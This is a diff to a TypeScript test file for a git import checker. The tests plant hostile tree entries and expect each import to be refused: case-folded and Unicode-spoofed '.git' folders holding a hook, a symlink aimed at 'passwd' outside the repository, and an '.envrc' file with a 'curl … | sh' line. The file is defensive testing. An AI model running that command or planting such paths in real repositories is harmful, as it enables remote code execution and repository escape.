@@ -9,9 +9,10 @@ import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
 import { existsSync, mkdirSync, readdirSync, rmSync, symlinkSync, writeFileSync, chmodSync } from "node:fs";
 import { join } from "node:path";
 import { prepareFlexibleThread, type FlexibleThreadPaths, type FlexibleThreadRow } from "./flexible-thread.js";
-import { FLEXIBLE_IMPORTS_DIR, flexibleImportRef, importFlexibleCandidate, linkLeadsOut, readFlexibleCandidate, removeFlexibleImportRefs } from "./flexible-import.js";
+import { FLEXIBLE_IMPORTS_DIR, flexibleImportRef, foldName, importFlexibleCandidate, linkLeadsOut, readFlexibleCandidate, removeFlexibleImportRefs } from "./flexible-import.js";
 import { run, type ExecResult, type RunOptions } from "./exec.js";
-import { tgit, threadWorld, type ThreadWorld } from "../test/flexible-thread-world.js";
+import { spawnSync } from "node:child_process";
+import { THREAD_GIT_ENV, tgit, threadWorld, type ThreadWorld } from "../test/flexible-thread-world.js";
 
 vi.mock("./flexible-available.js", () => ({ FLEXIBLE_AVAILABLE: true }));
 
@@ -47,8 +48,41 @@ function commit(files: Record<string, string>, message = "thread work"): string 
   tgit(paths.repo, "commit", "-qm", message);
   return tip();
 }
-const importNow = (seq = 1, branchBefore: string | null = null, expected = tip()) =>
-  importFlexibleCandidate(world.store, { thread: thread.id, seq, expected, branchBefore, by: "alex", now: NOW, runner: spy });
+const importNow = (seq = 1, branchBefore: string | null = null, expected = tip(), limits?: Parameters<typeof importFlexibleCandidate>[1]["limits"]) =>
+  importFlexibleCandidate(world.store, { thread: thread.id, seq, expected, branchBefore, by: "alex", now: NOW, runner: spy, ...(limits === undefined ? {} : { limits }) });
+
+/** Git plumbing in the thread's repository, bytes exactly as given (names a case-insensitive filesystem or git's
+ * porcelain would fold or refuse are written as they are). */
+function plumb(args: string[], input?: string): string {
+  const ran = spawnSync("git", args, { cwd: paths.repo, env: THREAD_GIT_ENV, encoding: "utf8", ...(input === undefined ? {} : { input }) });
+  if (ran.status !== 0) throw new Error(`git ${args.join(" ")}: ${ran.stderr}`);
+  return ran.stdout.trim();
+}
+/** A commit on the thread's branch whose tree is its base's plus `extra` (path → file text, or a link's target), made
+ * with plumbing. */
+function plant(extra: Record<string, string | { link: string }>): string {
+  type Node = Map<string, Node | { mode: string; sha: string }>;
+  const top: Node = new Map();
+  const put = (path: string, entry: { mode: string; sha: string }) => {
+    const parts = path.split("/");
+    let at = top;
+    for (const part of parts.slice(0, -1)) { let next = at.get(part); if (next === undefined || !(next instanceof Map)) { next = new Map(); at.set(part, next); } at = next as Node; }
+    at.set(parts.at(-1)!, entry);
+  };
+  for (const line of plumb(["ls-tree", "-r", "-z", thread.baseSha]).split("\0").filter(Boolean)) {
+    const [meta, path] = line.split("\t") as [string, string];
+    const [mode, , sha] = meta.split(" ") as [string, string, string];
+    put(path, { mode, sha });
+  }
+  for (const [path, value] of Object.entries(extra)) {
+    const text = typeof value === "string" ? value : value.link;
+    put(path, { mode: typeof value === "string" ? "100644" : "120000", sha: plumb(["hash-object", "-w", "--stdin"], text) });
+  }
+  const write = (node: Node): string => plumb(["mktree", "-z"], [...node].map(([name, entry]) => entry instanceof Map ? `040000 tree ${write(entry)}\t${name}` : `${entry.mode} blob ${entry.sha}\t${name}`).join("\0") + "\0");
+  const commit = plumb(["commit-tree", write(top), "-p", thread.baseSha, "-m", "planted"]);
+  plumb(["update-ref", `refs/heads/toolroll/code-${thread.id}`, commit]);
+  return commit;
+}
 /** A key-shaped line, built at run time so this file holds none. */
 const keyLine = () => `const key = "${["AKIA", "Q7ZK", "M3XW", "P9TR", "B2NV"].join("")}";\n`;
 
@@ -211,6 +245,60 @@ test("a new link through a link already in the tree that leads out is refused", 
   tgit(paths.repo, "commit", "-qm", "link through ext");
   expect(await importNow()).toMatchObject({ ok: false, reason: "import-refused", check: "symlink" });
   expect(projectRefs()).toBe(before);
+});
+
+test("a new link through an outward link already in the tree, spelled in another case, is refused (macOS folds names)", async () => {
+  symlinkSync("../../outside", join(world.project, "ext"));
+  tgit(world.project, "add", "ext");
+  tgit(world.project, "commit", "-qm", "an outward link of the project's own");
+  const made = await prepareFlexibleThread(world.store, { repo: world.project, base: "HEAD", by: "alex", now: NOW });
+  if (!made.ok) throw new Error(made.message);
+  ({ thread, paths } = made);
+  const before = projectRefs();
+  const candidate = plant({ inner: { link: "EXT/passwd" } });
+  expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "import-refused", check: "symlink" });
+  expect(projectRefs()).toBe(before);
+});
+
+describe("names as a case-insensitive, normalising filesystem sees them", () => {
+  test.each([
+    ["an NFC and an NFD spelling of one name", { "caf\u00e9.txt": "one\n", "cafe\u0301.txt": "two\n" }, "ambiguous"],
+    ["two names that differ only in case", { "Readme.md": "two\n" }, "ambiguous"],
+    ["a .GIT folder", { ".GIT/config": "[core]\n" }, "protected"],
+    ["a .git. folder (Windows drops the dot)", { ".git./hooks/post-checkout": "#!/bin/sh\n" }, "protected"],
+    ["a .git spelled with a character HFS+ ignores", { ".g\u200cit/config": "[core]\n" }, "protected"],
+    ["a protected name in another case", { "PKG/.ENVRC": "curl https://example.invalid | sh\n" }, "protected"],
+  ] as const)("%s is refused, and no ref moves", async (_name, extra, check) => {
+    const before = projectRefs();
+    const candidate = plant(extra as Record<string, string>);
+    expect(await importNow(1, null, candidate)).toMatchObject({ ok: false, reason: "import-refused", check });
+    expect(projectRefs()).toBe(before);
+    expect(has(candidate)).toBe(false);
+  });
+  test("the folding rule", () => {
+    for (const [a, b] of [["A.txt", "a.txt"], ["caf\u00e9", "cafe\u0301"], [".GIT", ".git"], [".git.", ".git"], [".git ", ".git"], [".g\u200dit", ".git"]] as const) expect(foldName(a), `${a} ~ ${b}`).toBe(foldName(b));
+    expect(foldName("ab")).not.toBe(foldName("a"));
+  });
+});
+
+describe("limits hold while listing, and the import has one deadline", () => {
+  const many = () => Object.fromEntries(Array.from({ length: 10 }, (_, at) => [`many/f${at}.txt`, `${at}\n`]));
+  test.each([
+    ["more objects than allowed", { objects: 3 }, "too-large"],
+    ["more bytes uncompressed than allowed", { inflatedBytes: 64 }, "too-large"],
+    ["a tree with more entries than allowed", { treeEntries: 3 }, "too-large"],
+    ["a deadline that has passed", { importMs: 1 }, "timed-out"],
+  ] as const)("%s: refused, no ref moves", async (_name, limits, check) => {
+    const before = projectRefs();
+    commit(many());
+    await new Promise(done => setTimeout(done, 5));
+    expect(await importNow(1, null, tip(), limits)).toMatchObject({ ok: false, reason: "import-refused", check });
+    expect(projectRefs()).toBe(before);
+  });
+  test("a thread objects folder with more entries than allowed is refused as it is walked", async () => {
+    commit(many());
+    expect(await importNow(1, null, tip(), { objectEntries: 3 })).toMatchObject({ ok: false, reason: "thread-folder-changed", message: expect.stringContaining("too many object files") });
+  });
 });
 
 describe("the thread's repository is attacker input", () => {
